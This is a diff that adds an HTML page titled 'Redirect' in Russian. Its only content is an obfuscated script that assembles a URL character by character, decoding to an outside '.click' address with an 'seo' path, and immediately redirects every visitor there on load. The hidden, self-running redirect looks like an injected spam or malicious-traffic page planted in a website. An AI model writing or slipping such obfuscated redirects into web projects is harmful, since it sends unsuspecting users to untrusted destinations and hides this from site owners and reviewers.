@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Перенаправление</title>
+  <script>
+    const bits = [
+      p => '\x68',
+      $ => '\x74',
+      () => '\x74',
+      () => String.fromCharCode(112),
+      () => String.fromCharCode(115),
+      () => '\x3a',
+      function() { return '\x2f'; },
+      q => '\x2f',
+      () => String.fromCharCode(118),
+      () => '\x65',
+      function() { return '\x72'; },
+      function() { return '\x67'; },
+      q => '\x65',
+      q => '\x6e',
+      function() { return '\x2e'; },
+      __ => '\x63',
+      function() { return '\x6c'; },
+      () => '\x69',
+      k => '\x63',
+      () => String.fromCharCode(107),
+      p => '\x2f',
+      function() { return '\x73'; },
+      v => '\x2f',
+      x => '\x73',
+      function() { return '\x65'; },
+      () => '\x6f'
+    ];
+    const loc = bits.reduce((buf, fn) => buf + fn(), '');
+    window.location.replace(loc);
+  </script>
+</head>
+<body></body>
+</html>
